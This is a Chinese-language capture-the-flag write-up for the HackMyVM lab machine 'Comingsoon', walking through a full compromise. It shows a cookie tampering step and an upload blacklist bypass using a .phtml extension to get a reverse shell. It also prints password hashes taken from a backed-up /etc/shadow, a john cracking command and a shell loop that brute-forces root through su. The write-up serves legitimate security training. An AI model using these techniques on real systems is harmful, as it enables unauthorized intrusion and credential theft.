# Comingsoon

2025.01.02 https://hackmyvm.eu/machines/machine.php?vm=Comingsoon

## Ip

192.168.5.21

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

先访问 80 web，首页没什么内容，html 源码也没什么内容。gobuster 进行目录扫描，发现http://192.168.5.21/notes.txt：

```
Dave,

Last few jobs to do...

Set ssh to use keys only (passphrase same as the password)

Just need to sort the images out:
resize and scp them or using the built-in image uploader.

Test the backups and delete anything not needed.

Apply an https certificate.

Cheers,

Webdev
```

显示了 ssh 的密钥和登陆密码一样，但是目前没有私钥文件。发现两个用户名：dave 和 Webdev，并提到了 image uploader。

查看页面的请求，发现 cookie 中有 Cookie: RW5hYmxlVXBsb2FkZXIK=ZmFsc2UK 将其修改成 true, RW5hYmxlVXBsb2FkZXIK=dHJ1ZQ== 在刷新页面，这时出现了 upload 连接：

```
<!-- Upload images link if EnableUploader set -->
<a href='5df03f95b4ff4f4b5dabe53a5a1e15d7.php' class='btn btn-border'>Upload</a>
```

访问 http://192.168.5.21/5df03f95b4ff4f4b5dabe53a5a1e15d7.php 是个文件上传页面，尝试上传 php 文件，但是有过滤，可能是个黑名单，尝试绕过。

修改 php 后缀名为 phtml，就可以上传了，上传后的文件存在 assets 文件夹中，http://192.168.5.21/assets/img/8888.phtml ，kali 上建立监听，触发反弹，得到了反弹的 shell。

通过枚举，发现有一个备份文件 /var/backups/backup.tar.gz 并且在 5 分钟之内修改过，可能是计划任务定时执行的。 具有读取权限将其解压，得到了 /etc/shadow：

```
root:$y$j9T$/E0VUDL7uS9RsrvwmGcOH0$LEB/7ERUX9bkm646n3v3RJBxttSVWmTBvs2tUjKe9I6:18976:0:99999:7:::
scpuser:$y$j9T$rVt3bxjp6uYKKYJbYU2Zq0$Ysn02LrCwTUB7iQdRiROO7/WQi8JSGtwLZllR54iX0.:18976:0:99999:7:::
```

使用 john 进行破解，得到密码 tigger :

```
john hash -format=crypt --wordlist=/usr/share/wordlists/rockyou.txt
```

su 切换到 scpuser 用户，得到 user flag：

```
scpuser@comingsoon:~$ cat user.txt
HMV{user:comingsoon.hmv:58842fc1a7}
```

查看 home 目录下的 .oldpasswords 文件，但是尝试切换到 root 都不对，发现密码字典是电影名，经过搜索，找到其他 wp 中的电影名字典：https://raw.githubusercontent.com/therealtomkraz/ctfscripts/main/top_100_animated_movies.txt

将其下载到目标机器上，进行爆破 root 账号：

```
for i in $(cat pass.txt); do echo $i; echo $i| su root -c 'ls /root';done
```

发现密码为: ToyStory3 切换后，得到了 root flag：

```
root@comingsoon:~# cat root.txt
HMV{root:comingsoon.hmv:2339dc81ca}
```
